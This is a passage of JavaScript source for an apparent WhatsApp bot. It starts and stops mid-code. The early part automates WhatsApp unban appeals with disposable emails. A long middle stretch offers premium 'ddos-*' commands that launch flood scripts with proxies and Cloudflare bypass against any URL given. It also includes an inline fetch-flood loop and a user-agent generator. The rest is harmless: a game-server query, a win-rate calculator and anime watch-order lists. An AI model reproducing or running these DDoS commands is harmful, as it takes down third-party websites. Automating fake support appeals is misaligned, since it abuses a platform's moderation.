if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break

case 'ddos-brow': {
if (!isPremium) return newReply(mess.prem)
if (!text) return newReply(`Example : ${prefix + command} [url]`)
newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
exec(`node ./File/ddos/ddos-brow.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
case 'ddos-mix': {
if (!isPremium) return newReply(mess.prem)
if (!text) return newReply(`Example : ${prefix + command} [url]`)
newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
exec(`node ./File/ddos/ddos-mix.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break       
case'ddos-lol':{
if (!isPremium) return newReply(mess.prem)
if (!text) return newReply(`Example : ${prefix + command} [url]`)
let ddosin = require("./File/ddos/ddos-lol.js")
ddosin(`${text}`)
if (args.length === 1 && text) {
newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`)
exec(`node ./File/ddos/ddos-lol.js`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}}
break
case 'ddos-tls': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-tls-v2': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-kilua': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-tls-bypass': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-bypass-cf': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-tls-vip': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-floods': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-egao': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-xchrome': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
newReply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./File/ddos/ddos-chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
newReply(`Example : ${prefix + command}  [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-fetch': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1] * 1000

if (args.length === 2 && url && !isNaN(time)) {
let attack = () => {
let totalRequests = 0
let threads = []

for (let j = 0; j < 6; j++) {
threads.push(
new Promise((resolve, reject) => {
let interval = setInterval(() => {
for (let j = 0; j < 100; j++) {
fetch(url)
.then(() => {
totalRequests++
console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
})
.catch(err => {})
}
}, 750)
setTimeout(() => {
clearInterval(interval)
resolve()
}, time)
})
)
}

Promise.all(threads)
.then(() => console.log("Attack complete"))
.catch(err => console.error("Error in attack:", err))
}

attack()
} else {
newReply(`Example : ${prefix + command}  [url] [time]`)
}
}
break
case 'ua': {
    if (!text) { 
        return newReply('❌ What do you want.'); 
    }
    
    const command = args[0];
    const need = args[1];

    if (command === 'create') {
        if (!need) {
            return newReply('❌ Please provide the required input for create.');
        }
        
        exec(`node ./File/ddos/uagen.js ${need} ua.txt`, (error, stdout, stderr) => {
            if (error) {
                console.error('Error Creating User Agent:', error);
                newReply('Error Creating User Agent.');
            } else {
                console.log('User Agent created successfully.');
                newReply('User Agent created successfully.');
            }
        });
    } else if (command === 'total') {
        fs.readFile('./ua.txt', 'utf8', (err, data) => {
            if (err) {
                console.error('Error reading ua file:', err);
                newReply('Error reading ua file.');
                return;
            }

            const proxies = data.trim().split('\n');
            const totalProxies = proxies.length;
            ToxxicTechInc.sendMessage(m.chat, { 
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true, 
                        title: `User Agent Total`,
                        body: `List ${totalProxies}`,
                        mediaType: 1,  
                        renderLargerThumbnail: true,
                        thumbnailUrl: `https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg/1d96543937ea1ca04aebc.png`,
                        sourceUrl: ``
                    }
                }, 
                text: `User Agent Total: ${totalProxies}` 
            }, { quoted: m });
        });
    } else if (command === 'download') {
        const proxyPath = './ua.txt';
        ToxxicTechInc.sendFile(m.chat, proxyPath, 'ua.txt', 'Downloaded User Agent...');
    } else {
        newReply('Invalid .ua command. Usage: .ua create <input>, total, or download');
    }
};
break
case 'samp-info': {
    if (!args[0]) {
        newReply('Please provide valid IP')
        return
    }

    const [ip, port] = args[0].split(':')

    if (!ip || !port) {
        newReply('Invalid format. Please enter IP and port in the format IP:port')
        return
    }

    samp({ host: ip, port: parseInt(port) }, (error, response) => {
        if (error) {
            newReply(`Error: ${error.message}`)
            return
        }

        newReply(`Server Info:
Hostname: ${response.hostname}
Players: ${response.online}/${response.maxplayers}
Gamemode: ${response.gamemode}
Map: ${response.mapname}
Passworded: ${response.passworded}
Version: ${response.rules.version}
Weather: ${response.rules.weather}
WebURL: ${response.rules.weburl}
WorldTime: ${response.rules.worldtime}`)
    })
}
break
case 'calcwr':
    if (!args || args.length !== 3) return newReply('Usage: .calcwr (Total matches) (Current win rate) (Target win rate)');
    const totalMatch = parseInt(args[0]);
    const currentWR = parseFloat(args[1]);
    const targetWR = parseFloat(args[2]);

    if (isNaN(totalMatch) || isNaN(currentWR) || isNaN(targetWR)) return newReply('Please enter valid numbers.');
    if (currentWR < 0 || currentWR > 100 || targetWR < 0 || targetWR > 100) return newReply('Winrate must be in the range of 0 to 100.');

    const matchesNeeded = rumus(totalMatch, currentWR, targetWR);

    let resultMessage;
    if (targetWR >= currentWR) {
        resultMessage = `Winrate calc mobile legends\n\nData entered:\nTotal matches: ${totalMatch}\nCurrent win rate: ${currentWR}%\nTarget win rate: ${targetWR}%\n\nResult:\nIt requires ${matchesNeeded} matches to achieve a ${targetWR}% win rate.`;
    } else {
        resultMessage = `Winrate calc mobile legends\n\nData entered:\nTotal matches: ${totalMatch}\nCurrent win rate: ${currentWR}%\nTarget win rate: ${targetWR}%\n\nResult:\nIt requires ${matchesNeeded} matches to achieve a ${targetWR}% win rate, considering losses.`;
    }
    
    newReply(resultMessage);
    break
case'metaai':
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `ToxxicTechInc`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:ToxxicTechInc;Botz;;;\nFN:ToxxicTechInc\nTEL;type=Mobile;waid=13135550002:+62 838-2553-6262\nEND:VCARD",
}
}), { userJid: m.chat, quoted: m })
ToxxicTechInc.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
case 'upssa': {
 let ah = require('./lib/ssh-uploader.js')
 let q = m.quoted ? m.quoted : m
 let mime = (q.msg || q).mimetype || ''
 if (!mime) return newReply(`Send or reply to images/video/sticker/doc with commands ${prefix + command}`)
 
 ToxxicTechInc.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
 
 let hy = await q.download()
 if (!hy) return newReply('not detected')
 
 let res = await ah.uploaderSSA(hy)
 if (!res.status) return newReply(JSON.stringify(res, null, 2))
 
 await newReply(JSON.stringify(res, null, 2))
}
break
case 'animeorder': {
	if (!text)
		return newReply(`Example : ${prefix + command} < title>
Example : ${prefix + command} Fate

*「 Title Anime 」*
- Amagi Brilliant Park 
- Ao No Exorcist
- Arifureta
- Berserk
- Bleach
- Boku no Hero Academia
- Bungou Stray Dogs
- Chuunibyou Demo Koi ga Shitai
- Date A Live
- Danmachi
- Danganronpa
- Digimon
- Dragon Ball
- Fairy Tail
- Fate
- Gintama
- Gochuumon wa Usagi Desu ka
- Grisaia
- Gundam
- Haikyuu
- Hibike Euphonium
- High School Dxd
- Himouto Umaru-chan
- Hitsugi no Chaika
- Infinite Stratos
- Kaguya-sama Love is War
- Kamisama Hajimemashita
- Kara no Kyoukai
- Kimetsu no Yaiba
- Kingdom
- Magi
- Meitantei Conan
- Monogatari
- Nanatsu no Taizai
- Naruto
- Naruto Shippuden
- Natsume Yuujinchou
- Non Non Biyori
- No Game No Life
- One Piece
- One Punch Man
- Owari no Seraph
- Oregairu
- Overlord
- Psycho Pass
- Re Zero
- Saiki Kusuo
- Saint Seiya
- Shingeki no Kyojin
- Shokugeki no Souma
- Slam Dunk
- Strike The Blood
- Strike Witches
- Steins Gate
- Sword Art Online
- Tensei Shitara Slime Datta Ken
- Toaru
- To Love-ru
- Tokyou Ghoul
- Himouto Umaru-chan
- Yuuki Yuuna
- Yuru Camp
- Yuru Yuri
- Zero no Tsukaima`, m)
	if (args[0]?.toLowerCase() === "arifureta") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Arifureta Shokugyou de Sekai Saikyou ࿐໋*\n
- Arifureta Shokugyou de Sekai Saikyou
- Arifureta Shokugyou de Sekai Saikyou Specials
- Arifureta Shokugyou de Sekai Saikyou 2nd Season`,
			},
			{ quoted: m },
		);
	} else if (text === "amagi brilliant park") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Amagi Brilliant Park ࿐໋*\n
- Amagi Brilliant Park
- Amagi Brilliant Park: Wakuwaku Mini Theater - Rakugaki Backstage
- Amagi Brilliant Park: Nonbirishiteiru Hima ga Nai!`,
			},
			{ quoted: m },
		);
	} else if (text === "zero no tsukaima") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Zero no Tsukaima ࿐໋*

- Zero no Tsukaima
- Zero no Tsukaima: Futatsuki no Kishi
- Zero no Tsukaima: Princesses no Rando
- Zero no Tsukaima: Princesses no Rondo Picture Drama
- Zero no Tsukaima: Princesses no Rondo - Yuuwaku no Sunahama
- Zero no Tsukaima F`,
			},
			{ quoted: m },
		);
	} else if (text === "tokyo ghoul") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Tokyo Ghoul ࿐໋*

Watch order tokyo ghoul berdasarkan storyline :
- Tokyo Ghoul
- Tokyo Ghoul: Pinto
- Tokyo Ghoul √A
- Tokyo Ghoul: Jack
- Tokyo Ghoul: Re
- Tokyo Ghoul: Re 2`,
			},
			{ quoted: m },
		);
	} else if (text === "to love-ru") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order To LOVE-Ru ࿐໋*

Watch order dari alur cerita:
- To LOVE-Ru
- To LOVE-Ru OVA
- Motto to LOVE-Ru
- To LOVE-Ru Darkness
- To LOVE-Ru Darkness 2nd

Watch order Rekomendasi:
- To LOVE-Ru
- To LOVE-Ru OVA
- Motto to LOVE-Ru
- To LOVE-Ru Darkness
- To Love-Ru: Trouble - Darkness OVA
- To LOVE-Ru Darkness 2nd
- To LOVE-Ru Darkness 2nd OVA
- To LOVE-Ru Darkness 2nd Specials
- To Love-Ru: Trouble - Multiplication - Mae kara Ushiro kara`,
			},
			{ quoted: m },
		);
	} else if (text === "sword art online") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Sword Art Online ࿐໋*

- Sword Art Online Season 1
- Sword Art Online: Progressive (ini sama dengan season 1, bedanya disini Asuna lebih sering muncul)
- Sword Art Online: Extra Edition
- Sword Art Online Season 2
- Sword Art Online Alternative: Gun Gale Online (Spin Off)
- Sword Art Online Ordinal Scale
- Sword Art Online: Alicization
- Sword Art Online: Alicization War of Underworld
- Sword Art Online: Alicization War of Underworld Part 2`,
			},
			{ quoted: m },
		);
	} else if (text === "tensei shitara slime datta ken") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Tensei shitara slime Datta Ken ࿐໋*

- Tensei Shitara Slime Datta Ken
- Tensei Shitara Slime Datta Ken OVA
- Tensei Shitara Slime Datta Ken 2nd Season
- Tensei Shitara Slime Datta Ken 2nd Season Part 2

Spin Off : 
- Tensura Nikki: Tensei Shitara Slime Datta Ken`,
			},
			{ quoted: m },
		);
	} else if (text === "steins gate") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Steins Gate ࿐໋*

- Steins; Gate
- Steins; Gate: Kyoukaimenjou no Missing Link Divide by Zero
- Steins;Gate: Soumei Eichi no Cognitive Computing
- Steins; Gate: Kesshou Takei no Valentine Bittersweet Intermedio
- Steins; Gate 0
- Steins; Gate 0 OVA Oukoubakko no Porlomania
- Steins; Gate: Fuka Ryouiki no Deja Vu`,
			},
			{ quoted: m },
		);
	} else if (text === "strike the blood") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Strike the Blood ࿐໋*

- Strike the Blood
- Strike the Blood: Valkyria no Oukoku-hen
- Strike the Blood II
- Strike the Blood III
- Strike the Blood: Kieta Seisou-hen
- Strike the Blood IV`,
			},
			{ quoted: m },
		);
	} else if (text === "strike witches") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Ururan Nonton Strike Witches ࿐໋*

- Strike Witches
- Brave Witches
- Strike Witches 2
- Strike Witches: Operation Victory Arrow 
- Strike Witches Movie
- Strike Witches: Road to Berlin`,
			},
			{ quoted: m },
		);
	} else if (text === "slam dunk") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Slam Dunk ࿐໋*

- Slam Dunk Eps 1-20
- *Slam Dunk (Movie)*
- Slam Dunk Eps 21-26
- *Slam Dunk: Zenkoku Seiha Da! - Sakuragi Hanamichi*
- Slam Dunk Eps 37-60
- *Slam Dunk: Shouhoku Saidai no Kiki! Moero Sakuragi Hanamichi*
- *Slam Dunk: Hoero Basketman-damashii! Hanamichi to Rukawa no Atsuki Natsu*
- Slam Dunk Eps 61-101
- *THE FIRST SLAM DUNK*`,
			},
			{ quoted: m },
		);
	} else if (text === "shokugeki no souma") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Shokugeki no Souma ࿐໋*

- Shokugeki no Souma
- Shokugeki no Souma Ova 1 & 2
- Shokugeki no Souma : Ni no Sora 
- Shokugeki no Souma : Ni no Sora Ova 1 & 2
- Shokugeki no Souma : San no Sara
- Shokugeki no Souma : San no Sara - Tootsuki Ressha - hen
- Shokugeki no Souma : San no Sara - Kyokuseiryou no Erina
- Shokugeki no Souma : Shin no Sara
- Shokugeki no Souma : Gou no Sara`,
			},
			{ quoted: m },
		);
	} else if (text === "shingeki no kyojin") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Shingeki no Kyojin ࿐໋*

- Shingeki no Kyojin Season 1
- Chimi Kyara Gekijō – Tondeke! Kunren Heidan
- Shingeki no Kyojin Season 1 OVA
- Attack on Titan – Part 1: Crimson Bow and Arrow
- Shingeki no Kyojin Kui Naki Sentaku
- Attack on Titan – Part 2: Wings of Freedom
- Shingeki no Kyojin Season 2
- Shingeki no Kyojin: Lost Girls
- Attack on Titan: The Roar of Awakening
- Shingeki no Kyojin Season 3 Court/Part 1
- Shingeki no Kyojin Season 3 Court/Part 2
- Shingeki no Kyojin: Chronicle
- Shingeki no Kyojin: The Final Season`,
			},
			{ quoted: m },
		);
	} else if (text === "re zero") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Re: Zero kara Hajimeru ࿐໋*

- Re:Zero kara Hajimeru Isekai Seikatsu
- Re:Zero kara Hajimeru Break Time (Gak Wajib)
- Re:Petit kara Hajimeru Isekai Seikatsu (Gak Wajib)
- Re:Zero kara Hajimeru Isekai Seikatsu - Memory Snow
- Re:Zero kara Hajimeru Isekai Seikatsu - Hyouketsu no Kizuna
- Re:Zero kara Hajimeru Isekai Seikatsu 2nd Season
- Re:Zero kara Hajimeru Break Time 2nd Season (Gak Wajib)
- Re:Zero kara Hajimeru Isekai Seikatsu 2nd Season Part 2`,
			},
			{ quoted: m },
		);
	} else if (text === "boku no hero academia") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Boku no Hero Academia ࿐໋*

- Boku no Hero Academia
- Boku no Hero Academia: Sukue! Kyuujo Kunren!
- Boku no Hero Academia Season 2
- Boku no Hero Academia: Training of the Death
- Boku no Hero Academia Season 3
- Boku no Hero Academia: All Might Rising
- Boku no Hero Academia: Futari Hero (Movie 1)
- Boku no Hero Academia Season 4
- Boku no Hero Academia: Heroes: Rising (Movie 2)
- Boku no Hero Academia: Make it! Do or Die Survival Training!
- Boku no Hero Academia Season 5
- Boku no Hero Academia Movie 3`,
			},
			{ quoted: m },
		);
	} else if (text === "chuunibyou demo koi ga shitai") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Chuunibyou demo koi ga shitai ࿐໋*

- Chuunibyou Demo Koi ga Shitai
- Chuunibyou Demo Koi ga Shitai: Takanashi Rikka kai!
- Chuunibyou Demo Koi ga Shitai: Lite!
- Chuunibyou Demo Koi ga Shitai: Depth of Field
- Chuunibyou Demo Koi ga Shitai: Ren!
- Chuunibyou Demo Koi ga Shitai: Ren Lite!
- Chuunibyou Demo Koi ga Shitai: Special
- Chuunibyou Demo Koi ga Shitai: Take on Me!`,
			},
			{ quoted: m },
		);
	} else if (text === "high school dxd") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order High School Dxd ࿐໋*

- Highschool DxD
- Highschool DxD: OVA
- Highschool DxD New
- Highschool DxD New Episode 13 Special
- Highschool DxD BorN
- Highschool DxD BorN: Yomigaerani Fushichou
- Highschool DxD Hero: Taiikukan-ura no Holy
- Highschool DxD Hero`,
			},
			{ quoted: m },
		);
	} else if (text === "hibike euphonium") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Hibike! Euphonium ࿐໋*

Main Story
- Hibike! Euphonium 
- Hibike! Euphonium S2
- Hibike! Euphonium: Chikai no Finale

Movie Recap
- Hibike! Euphonium: Kitauji Koukou Suisougaku-bu e Youkoso (recap season 1)
- Hibike! Euphonium: Todoketai Melody (recap season 2)

Movie Spin-off
- Liz to Aoi Tori`,
			},
			{ quoted: m },
		);
	} else if (text === "fairy tail") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Fairy Tail ࿐໋*

- Fairy Tail
- Fairy Tail Ova
- Fairy Tail Movie 1: Hounou no Miko
- Fairy Tail: Hounou no Miko – Hajimari no Asa Spesial
- Fairy Tail x Rave
- Fairy Tail Season 2
- Fairy Tail Movie 2: Dragon City
- Fairy Tail: Final Series`,
			},
			{ quoted: m },
		);
	} else if (text === "date a live") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Date A Live ࿐໋*

- Date A Live
- Date A Live: Date to Date (Ova)
- Date A Live II
- Date A Live: Encore (Ova)
- Date A Live Movie: Mayuri Judgment
- Date A Live II

Spin off : 
- Date A Bullet: Dead or Bullet 
- Date A Bullet: Nightmare or Queen`,
			},
			{ quoted: m },
		);
	} else if (text === "one punch man") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order One Punch Man ࿐໋*

- One Punch Man
- One Punch Man: Road to Hero (Ova)
- One Punch Man Specials
- One Punch Man Season 2
- One Punch Man Season 2 Specials`,
			},
			{ quoted: m },
		);
	} else if (text === "kamisama hajimemashita") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Kamisama Hajimemashita ࿐໋*

- Kami-sama Hajimemashita
- Kamisama Hajimemashita OVA
- Kamisama Hajimemashita◎
- Kamisama Hajimemashita: Kako-hen`,
			},
			{ quoted: m },
		);
	} else if (text === "psycho pass") {
		ToxxicTechInc.sendMessage(
